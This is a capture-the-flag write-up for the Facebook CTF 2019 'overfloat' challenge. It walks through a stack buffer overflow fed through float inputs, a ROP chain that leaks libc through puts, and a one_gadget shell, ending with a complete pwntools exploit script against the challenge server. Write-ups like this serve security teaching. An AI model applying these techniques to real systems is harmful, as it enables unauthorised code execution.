# Facebook CTF 2019 Overfloat

This challenge was a team effort, my fellow Nasa Rejects team mate qw3rty01 helped me out with tthis one.

One thing about this challenge, it is supposed to be done with the `libc-2.27.so`, which is the default libc version for Ubuntu `18.04`. You can check what libc version is loaded in by checking the memory mappings with in gdb with the `vmmap` command. If it isn't the default, you will need to so something like using ptrace to switch the libc version, or adjust the offsets to match your own libc file.

Let's take a look at the binary:

```
$	file overfloat 
overfloat: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=8ae8ef04d2948115c648531ee0c12ba292b92ae4, not stripped
$	pwn checksec overfloat 
[*] '/Hackery/fbctf/overfloat/dist/overfloat'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

So we can see that it we are given a `64` bit dynamically linked binary, with a non-executable stack. In addition to that we are give the libc file `libc-2.27.so`. Running the program we see that it prompts us for latitude / longtitude pairs:

```
$	./overfloat 
                                 _ .--.        
                                ( `    )       
                             .-'      `--,     
                  _..----.. (             )`-. 
                .'_|` _|` _|(  .__,           )
               /_|  _|  _|  _(        (_,  .-' 
              ;|  _|  _|  _|  '-'__,--'`--'    
              | _|  _|  _|  _| |               
          _   ||  _|  _|  _|  _|               
        _( `--.\_|  _|  _|  _|/               
     .-'       )--,|  _|  _|.`                 
    (__, (_      ) )_|  _| /                   
      `-.__.\ _,--'\|__|__/                  
                    ;____;                     
                     \YT/                     
                      ||                       
                     |""|                    
                     '=='                      

WHERE WOULD YOU LIKE TO GO?
LAT[0]: 4
LON[0]: 2
LAT[1]: 8
LON[1]: 4
LAT[2]: 2
LON[2]: 8
LAT[3]: Too Slow! Sorry :(
```

When we look at the main function in Ghidra, we see this code:

```
undefined8 main(void)

{
  undefined charBuf [48];
  
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  alarm(0x1e);
  __sysv_signal(0xe,timeout);
  puts(
      "                                 _ .--.        \n                                ( `    )      \n                             .-\'      `--,     \n                  _..----.. (            )`-. \n                .\'_|` _|` _|(  .__,           )\n               /_|  _|  _|  _(       (_,  .-\' \n              ;|  _|  _|  _|  \'-\'__,--\'`--\'    \n              | _|  _| _|  _| |               \n          _   ||  _|  _|  _|  _|               \n        _( `--.\\_| _|  _|  _|/               \n     .-\'       )--,|  _|  _|.`                 \n    (__, (_     ) )_|  _| /                   \n      `-.__.\\ _,--\'\\|__|__/                  \n                   ;____;                     \n                     \\YT/                     \n                     ||                       \n                     |\"\"|                    \n                    \'==\'                      \n\nWHERE WOULD YOU LIKE TO GO?"
      );
  memset(charBuf,0,0x28);
  chart_course(charBuf);
  puts("BON VOYAGE!");
  return 0;
}
```

Looking through the code here, we see that the part we are really interested about is `chart_course` function call, which takes the pointer `charBuf` as an argument. When we look at the `chart_course` disassembly in Ghidra, we see this: 

```
void chart_course(long ptr)

{
  int doneCheck;
  uint uVar1;
  double float;
  char input [104];
  uint lat_or_lon;
  
  lat_or_lon = 0;
  do {
    if ((lat_or_lon & 1) == 0) {
      uVar1 = ((int)(lat_or_lon + (lat_or_lon >> 0x1f)) >> 1) % 10;
      printf("LAT[%d]: ",(ulong)uVar1,(ulong)uVar1);
    }
    else {
      uVar1 = ((int)(lat_or_lon + (lat_or_lon >> 0x1f)) >> 1) % 10;
      printf("LON[%d]: ",(ulong)uVar1,(ulong)uVar1,(ulong)uVar1);
    }
    fgets(input,100,stdin);
    doneCheck = strncmp(input,"done",4);
    if (doneCheck == 0) {
      if ((lat_or_lon & 1) == 0) {
        return;
      }
      puts("WHERES THE LONGITUDE?");
      lat_or_lon = lat_or_lon - 1;
    }
    else {
      float = atof(input);
      memset(input,0,100);
      *(float *)(ptr + (long)(int)lat_or_lon * 4) = (float)float;
    }
    lat_or_lon = lat_or_lon + 1;
  } while( true );
}
```

Looking at this function, we can see that it essentially scans in data as four byte floats into the char ptr that is passed to the function as an argument. It does this by scanning in `100` bytes of data into `input`, converting it to a float stored in `float`, and then setting `ptr + (x * 4)` equal to `float` (where `x` is equal to the amount of floats scanned in already). There is no checking to see if it overflows the buffer, and with that we have a buffer overflow.

That is ran within a do while loop, that on paper can run forever (since the condition is while(true)). However there the termination condition is if the first four bytes of our input is `done`. Keep in mind that the buffer that we are overflowing is from the stack in `main`, so we need to return from the main function before getting code exeuction.

Also there is functionallity which will swap between prompting us for either `LAT` or `LON`, and which one in the sequence there is. However this doesn't affect us too much.

Now we need to exploit the bug. In the main function since `charBuf` is the only thing on the stack, there is nothing between it and the saved base pointer. Add on an extra `8` bytes for the saved base pointer to the `48` bytes for the space `charBuf` takes up and we get `56` bytes to reach the return address. Now the question is what code do we execute? I decided to go with a ROP Chain using gagdets and imported functions from the binary, since PIE isn't enabled so we don't need an infoleak to do this. However the binary isn't too big so we don't have the gadgets we would need to pop a shell.

To counter this, I would just setup a `puts` call(since `puts` is an imported function, we can call it) with the got address of `puts` to give us a libc infoleak, then loop back around by calling the start of `main` which would allow us to exploit the same bug again with a libc infoleak. Then we can just write a onegadget to the return address to pop a shell.

Now we need to setup the first part of the infoleak. First find the plt address of puts `0x400690`:

```
objdump -D overfloat | grep puts
0000000000400690 <puts@plt>:
  400690:	ff 25 8a 19 20 00    	jmpq   *0x20198a(%rip)        # 602020 <puts@GLIBC_2.2.5>
  400846:	e8 45 fe ff ff       	callq  400690 <puts@plt>
  400933:	e8 58 fd ff ff       	callq  400690 <puts@plt>
  4009e8:	e8 a3 fc ff ff       	callq  400690 <puts@plt>
  400a14:	e8 77 fc ff ff       	callq  400690 <puts@plt>
```

Next find the got entry address for puts:

```
$	objdump -R overfloat | grep puts
0000000000602020 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
```

Finally we just need to gadget to pop an argument into the `rdi` register than return:

```
$	python ROPgadget.py --binary overfloat | grep "pop rdi"
0x0000000000400a83 : pop rdi ; ret
```

Also for the loop around address, I just tried the start of main and it worked. After we get the libc infoleak we can just subtract the offset of puts from it to get the libc base. The only part that remains is the onegadget. I just tried the first one and it worked (I decided to go with guess and check instead of checking the conditions when the gadget would be executed):

```
$	one_gadget libc-2.27.so 
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
```

With that we have everything we need to build our exploit. Since all of our inputs are interpreted as floats, we have to jump through a few hoops in order to get our inputs correct:

```
from pwn import *
import struct

# Establish values for the rop chain
putsPlt = 0x400690
putsGot = 0x602020
popRdi = 0x400a83

startMain = 0x400993
oneShot = 0x4f2c5

# Some helper functions to help with the float input
# These were made by qw3rty01
pf = lambda x: struct.pack('f', x)
uf = lambda x: struct.unpack('f', x)[0]

# Establish the target, and the libc file
target = remote("challenges.fbctf.com", 1341)
#target = process('./overfloat')
#gdb.attach(target)

# If for whatever reason you are usign a different libc file, just change it out here and it should work
libc = ELF('libc-2.27.so')

# A helper function to send input, made by a team mate
def sendVal(x):
    v1 = x & ((2**32) - 1)
    v2 = x >> 32
    target.sendline(str(uf(p32(v1))))
    target.sendline(str(uf(p32(v2))))

# Fill up the space between the start of our input and the return address
for i in xrange(7):
    sendVal(0xdeadbeefdeadbeef)

# Send the rop chain to print libc address of puts
# then loop around to the start of main

sendVal(popRdi)
sendVal(putsGot)
sendVal(putsPlt)
sendVal(startMain)

# Send done so our code executes
target.sendline('done')

# Print out the target output
print target.recvuntil('BON VOYAGE!\n')

# Scan in, filter out the libc infoleak, calculate the base
leak = target.recv(6)
leak = u64(leak + "\x00"*(8-len(leak)))
base = leak - libc.symbols['puts']

print "libc base: " + hex(base)

# Fill up the space between the start of our input and the retun address
# For the second round of exploiting the bug
for i in xrange(7):
    sendVal(0xdeadbeefdeadbeef)

# Overwrite the return address with a onegadget
sendVal(base + oneShot)

# Send done so our rop chain executes
target.sendline('done')

target.interactive()
```
